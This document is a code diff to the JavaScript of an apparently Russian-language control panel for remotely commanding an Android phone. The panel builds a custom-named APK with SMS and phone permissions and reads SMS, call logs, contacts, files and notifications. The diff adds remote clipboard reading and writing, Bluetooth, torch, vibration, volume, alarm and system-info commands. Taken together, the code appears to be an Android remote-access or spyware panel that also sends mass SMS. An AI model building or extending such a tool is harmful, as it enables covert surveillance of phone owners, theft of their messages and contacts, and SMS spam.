@@ -61,6 +61,8 @@ document.querySelectorAll('.tab').forEach((tab) => {
     document.querySelectorAll('.tab-content').forEach((c) => c.classList.remove('active'));
     tab.classList.add('active');
     $('#tab-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'dashboard') { loadDashboard(); phoneSend({ cmd: 'get-system-info' }); }
+    if (tab.dataset.tab === 'commands') loadCommandsTab();
     if (tab.dataset.tab === 'apps') loadApps();
     if (tab.dataset.tab === 'files') loadFiles($('#filePath').value);
     if (tab.dataset.tab === 'notifs') loadNotifs();
@@ -581,6 +583,7 @@ $('#buildBtn').onclick = async () => {
   if ($('#permNotif').checked) perms.push('NOTIFICATIONS');
   if ($('#permPhone').checked) perms.push('PHONE');
   if ($('#permSms').checked) perms.push('SMS');
+  if ($('#permBluetooth').checked) perms.push('BLUETOOTH');
   const fd = new FormData();
   fd.append('appName', $('#bAppName').value);
   fd.append('applicationId', $('#bAppId').value);
@@ -808,6 +811,8 @@ function startCallsViewer(requestDataOnOpen) {
       phoneSend({ cmd: 'get-phone-info' });
       phoneSend({ cmd: 'get-call-log' });
       phoneSend({ cmd: 'get-contacts' });
+      phoneSend({ cmd: 'get-system-info' });
+      phoneSend({ cmd: 'get-volume' });
     }
   };
   wsPhone.onmessage = (ev) => {
@@ -864,6 +869,26 @@ function startCallsViewer(requestDataOnOpen) {
             log.scrollTop = log.scrollHeight;
           }
         }
+      } else if (m.type === 'system-info') {
+        renderSystemInfo(m);
+      } else if (m.type === 'volume-info') {
+        renderVolumeInfo(m.streams || {});
+      } else if (m.type === 'bluetooth-status') {
+        if (!m.ok && m.msg) toast('Bluetooth: ' + m.msg, true);
+        else toast(m.enabled ? '🔵 Bluetooth включён' : 'Bluetooth выключен');
+      } else if (m.type === 'torch-status') {
+        if (!m.ok && m.msg) toast('Фонарик: ' + m.msg, true);
+        else toast(m.enabled ? '🔦 Фонарик включён' : 'Фонарик выключен');
+      } else if (m.type === 'clipboard-text') {
+        const el = $('#clipText');
+        if (el) el.textContent = m.text || '(пусто)';
+        if (m.err) toast('Буфер: ' + m.err, true);
+      } else if (m.type === 'clipboard-set') {
+        toast(m.ok ? 'Буфер обмена записан' : ('Ошибка: ' + (m.msg || '')), !m.ok);
+      } else if (m.type === 'alarm-set') {
+        toast(m.ok ? ('✓ ' + (m.msg || 'Будильник поставлен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
+      } else if (m.type === 'timer-set') {
+        toast(m.ok ? ('✓ ' + (m.msg || 'Таймер запущен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
       } else if (m.type === 'sms-broadcast-done') {
         $('#broadcastBtn').disabled = false;
         $('#broadcastBtn').textContent = '📢 Разослать';
@@ -1228,6 +1253,97 @@ $('#sendSmsBtn').onclick = () => {
   phoneSend({ cmd: 'send-sms', number, text });
 };
 $('#refreshSms').onclick = () => phoneSend({ cmd: 'get-sms' });
+
+// ---------- Команды ----------
+function loadCommandsTab() {
+  phoneSend({ cmd: 'get-system-info' });
+  phoneSend({ cmd: 'get-volume' });
+}
+
+function renderSystemInfo(m) {
+  const fmt = (b) => {
+    if (b == null) return '—';
+    const gb = b / 1024 / 1024 / 1024;
+    return gb >= 1 ? gb.toFixed(1) + ' ГБ' : (b / 1024 / 1024).toFixed(0) + ' МБ';
+  };
+  const rows = [];
+  if (m.ramTotal != null) {
+    const used = m.ramTotal - m.ramAvail;
+    rows.push(`<b>💾 RAM</b><span>${fmt(used)} / ${fmt(m.ramTotal)}</span>`);
+  }
+  if (m.storIntTotal != null) {
+    const used = m.storIntTotal - m.storIntFree;
+    rows.push(`<b>📦 Хранилище</b><span>${fmt(used)} / ${fmt(m.storIntTotal)}</span>`);
+  }
+  if (m.storExtTotal != null) {
+    const used = m.storExtTotal - m.storExtFree;
+    rows.push(`<b>📦 SD-карта</b><span>${fmt(used)} / ${fmt(m.storExtTotal)}</span>`);
+  }
+  if (m.batteryTemp != null) rows.push(`<b>🌡 Батарея</b><span>${m.batteryTemp.toFixed(1)} °C</span>`);
+  if (m.cpuTemp != null) rows.push(`<b>🌡 CPU</b><span>${m.cpuTemp.toFixed(1)} °C</span>`);
+  if (m.bluetoothEnabled != null) {
+    rows.push(`<b>🔵 Bluetooth</b><span>${m.bluetoothEnabled ? 'Включён' : 'Выключен'}</span>`);
+  }
+  const el = $('#sysInfoKv');
+  if (el) el.innerHTML = rows.length ? rows.join('') : '<span style="color:var(--muted)">Нет данных</span>';
+}
+
+function renderVolumeInfo(streams) {
+  document.querySelectorAll('.vol-slider').forEach((sl) => {
+    const s = streams[sl.dataset.stream];
+    if (!s) return;
+    sl.max = s.max;
+    sl.value = s.current;
+    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
+    if (val) val.textContent = `${s.current}/${s.max}`;
+  });
+}
+
+$('#cmdBtOn').onclick = () => phoneSend({ cmd: 'set-bluetooth', enabled: true });
+$('#cmdBtOff').onclick = () => phoneSend({ cmd: 'set-bluetooth', enabled: false });
+$('#cmdTorchOn').onclick = () => phoneSend({ cmd: 'set-torch', enabled: true });
+$('#cmdTorchOff').onclick = () => phoneSend({ cmd: 'set-torch', enabled: false });
+
+$('#vibrateMs').addEventListener('input', () => {
+  $('#vibrateMsVal').textContent = $('#vibrateMs').value + ' мс';
+});
+$('#cmdVibrate').onclick = () => phoneSend({ cmd: 'vibrate', ms: parseInt($('#vibrateMs').value) });
+
+const volSliderTimers = {};
+document.querySelectorAll('.vol-slider').forEach((sl) => {
+  sl.addEventListener('input', () => {
+    const stream = sl.dataset.stream;
+    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
+    if (val) val.textContent = `${sl.value}/${sl.max}`;
+    clearTimeout(volSliderTimers[stream]);
+    volSliderTimers[stream] = setTimeout(() => {
+      phoneSend({ cmd: 'set-volume', stream, value: parseInt(sl.value) });
+    }, 250);
+  });
+});
+
+$('#cmdClipRead').onclick = () => phoneSend({ cmd: 'get-clipboard' });
+$('#cmdClipWrite').onclick = () => {
+  const text = $('#clipWriteInput').value;
+  if (!text) { toast('Введи текст', true); return; }
+  phoneSend({ cmd: 'set-clipboard', text });
+};
+
+$('#cmdSetAlarm').onclick = () => {
+  const hour = parseInt($('#alarmHour').value) || 0;
+  const minute = parseInt($('#alarmMinute').value) || 0;
+  const label = $('#alarmLabel').value || 'Будильник';
+  phoneSend({ cmd: 'set-alarm', hour, minute, label });
+};
+
+$('#cmdSetTimer').onclick = () => {
+  const min = parseInt($('#timerMin').value) || 0;
+  const sec = parseInt($('#timerSec').value) || 0;
+  const seconds = min * 60 + sec;
+  if (!seconds) { toast('Укажи время таймера', true); return; }
+  const label = $('#timerLabel').value || 'Таймер';
+  phoneSend({ cmd: 'set-timer', seconds, label });
+};
 
 // ---------- Старт ----------
 loadDashboard();
